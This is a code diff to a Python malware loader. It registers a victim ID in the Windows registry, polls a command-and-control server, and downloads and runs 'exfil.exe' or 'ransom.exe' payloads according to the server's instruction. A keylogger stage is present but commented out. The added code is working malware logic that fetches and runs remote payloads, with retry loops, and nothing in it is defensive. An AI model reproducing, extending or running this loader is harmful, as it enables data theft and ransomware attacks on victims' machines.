@@ -213,28 +213,53 @@ class Loader:
         winreg.SetValueEx(key, "ID", 0, winreg.REG_SZ, str(self.victim_id))
         winreg.CloseKey(key)
 
-    def sync_loop(self):
-        while (
-            httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "False"
-        ):
+    def sync_loop(self, init_sleep=30):
+        sleep(init_sleep)
+        # 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
+        while httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "0":
             sleep(30)
-        if (
-            httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-            == "Exfiltration"
-        ):
-            self.load_exfiltration()
-        elif (
-            httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-            == "Keylogger"
-        ):
-            self.load_keylogger()
-        elif (
-            httpx.post(f"{c2_url}/sync/{self.victim_id}").headers["Action"]
-            == "Ransomware"
-        ):
-            self.load_ransomware()
+        if httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "1":
+            self.load_exfiltration_stage()
+        # elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "2":
+        #     self.load_keylogger_stage()
+        elif httpx.get(f"{c2_url}/sync/{self.victim_id}").headers["Action"] == "3":
+            self.load_ransomware_stage()
         else:
             sleep(30)
+
+    def load_exfiltration_stage(self):
+        print("Load exfiltration stage...")
+        try:
+            exfiltration_url = httpx.get(f"{c2_url}/static/exfiltration/exfil.exe")
+            with open("C:\\Users\\Test\Documents\\exfil.exe", "wb") as f:
+                f.write(exfiltration_url.content)
+            os.system("C:\\Users\\Test\Documents\\exfil.exe")
+            self.sync_loop(init_sleep=60)
+        except httpx.TimeoutException as err:
+            print("load_exfiltration(): Timeout Error --> ", err)
+            sleep(60)
+            self.load_exfiltration_stage()
+        except httpx.RequestError as err:
+            print("load_exfiltration(): Request Exception --> ", err)
+            sleep(60)
+            self.load_exfiltration_stage()
+
+    def load_ransomware_stage(self):
+        print("Load ransomware stage...")
+        try:
+            ransomware_url = httpx.get(f"{c2_url}/static/ransomware/ransom.exe")
+            with open("C:\\Users\\Test\Documents\\ransom.exe", "wb") as f:
+                f.write(ransomware_url.content)
+            os.system("C:\\Users\\Test\Documents\\ransom.exe")
+            self.sync_loop(init_sleep=60)
+        except httpx.TimeoutException as err:
+            print("load_exfiltration(): Timeout Error --> ", err)
+            sleep(60)
+            self.load_ransomware_stage()
+        except httpx.RequestError as err:
+            print("load_exfiltration(): Request Exception --> ", err)
+            sleep(60)
+            self.load_ransomware_stage()
 
 
 class Threading(object):
